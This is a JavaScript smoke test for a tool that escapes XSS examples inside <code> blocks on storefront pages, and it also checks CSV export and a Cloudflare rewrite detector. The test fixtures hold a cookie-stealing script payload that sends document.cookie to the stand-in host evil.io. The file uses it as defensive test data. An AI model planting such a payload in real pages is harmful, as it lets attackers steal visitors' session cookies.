'use strict';
// ─────────────────────────────────────────────────────────────────────────────
//  SMOKE: an example the author meant to SHOW must never be a script the
//  browser BUILDS, and a rule that cannot finish a page must hold it rather than
//  half-fix it.
//
//  Zero PII: public page markup only. No em-dashes, per repo convention.
//  Run: npm run smoke:cyberxss
// ─────────────────────────────────────────────────────────────────────────────
const m = require('../scripts/cyber-xss-example-escape');
const sf = require('../lib/storefront-fetch');

let pass = 0, fail = 0;
function ok(c, label, d) {
  if (c) { pass++; console.log('  [PASS] ' + label); }
  else { fail++; console.log('  [FAIL] ' + label + (d ? '\n         ' + d : '')); }
}

const CODE = '<p>x</p><code><script>fetch("evil.io/c="+document.cookie)</script></code>';
const REAL = '<script>(function(){document.querySelectorAll("a").forEach(function(x){});})();</script>';

console.log('\n1. position decides, not semantics');
ok(m.scopedTags(CODE).length === 2, '1.1 both tags inside a <code> are found');
ok(m.scopedTags(REAL).length === 0, '1.2 a real page script outside any <code> is not touched');
//  The two rules that were tried first and were WRONG, pinned so nobody retries them.
const payload = 'fetch("evil.io/c="+document.cookie)';
let parses = false;
try { new (require('vm').Script)(payload); parses = true; } catch (e) { parses = false; }
ok(parses, '1.3 the payload PARSES as JS, so "escape what does not parse" would have kept it running');
ok(/document\./.test(payload), '1.4 and it reads document.cookie, so "keep what looks like page code" '
  + 'would have kept it too. Only position separates them.');

console.log('\n2. the repair, and its bar');
const r = m.repair('x', CODE + REAL);
ok(!r.skip && !(r.problems || []).length, '2.1 a page with one scoped example is repaired',
  JSON.stringify(r.problems || r.skip));
ok(r.after && r.after.includes('&lt;script&gt;'), '2.2 the example tag is escaped');
ok(r.after && r.after.includes(REAL), '2.3 and the real page script is byte-identical');
ok(m.elements(r.after).length === 1, '2.4 exactly one script ELEMENT survives, the real one');

console.log('\n3. what stops a page reaching the sheet');
const notBroken = m.repair('x', '<p>fine</p>' + REAL);
ok(notBroken.skip && /not broken/.test(notBroken.skip),
  '3.1 a page with no executing payload and no fault is skipped, never edited');
const cf = m.repair('x', CODE + '<a class="__cf_email__" data-cfemail="ab">[email protected]</a>');
ok(cf.skip && /Cloudflare/.test(cf.skip),
  '3.2 a body Cloudflare rewrote at render time is skipped: importing it would make that permanent');
const stillBad = m.repair('x', CODE + '<script>var A={q:"he said "hi" ok"};</script>');
ok(stillBad.problems && stillBad.problems.some((p) => /still cannot be parsed/.test(p)),
  '3.3 a page carrying a SECOND defect this rule cannot reach is HELD, not half-fixed',
  JSON.stringify(stillBad.problems));
ok(Object.keys(m.EXCLUDE).length >= 1, '3.4 pages excluded by name carry their measured reason');

console.log('\n4. the sheet');
const csv = m.sheet([{ handle: 'h', body: r.after }]);
ok(csv.charCodeAt(0) === 0xFEFF, '4.1 UTF-8 BOM');
ok(csv.split('\r\n').length === 3, '4.2 CRLF between records');
ok(!/Published At/i.test(csv), '4.3 NO Published At column');
ok(csv.includes('"MERGE"'), '4.4 MERGE');

console.log('\n5. the shared Cloudflare detector, on the one door');
ok(typeof sf.cloudflareRewritten === 'function', '5.1 lib/storefront-fetch exports it');
ok(sf.cloudflareRewritten('<p>clean</p>') === null, '5.2 a clean body passes');
for (const k of ['__cf_email__', '/cdn-cgi/l/email-protection', 'data-cfemail', 'email-decode.min.js']) {
  ok(typeof sf.cloudflareRewritten('<p>' + k + '</p>') === 'string',
    '5.3 it catches ' + k);
}

console.log('\n' + pass + ' passed, ' + fail + ' failed');
process.exit(fail ? 1 : 0);
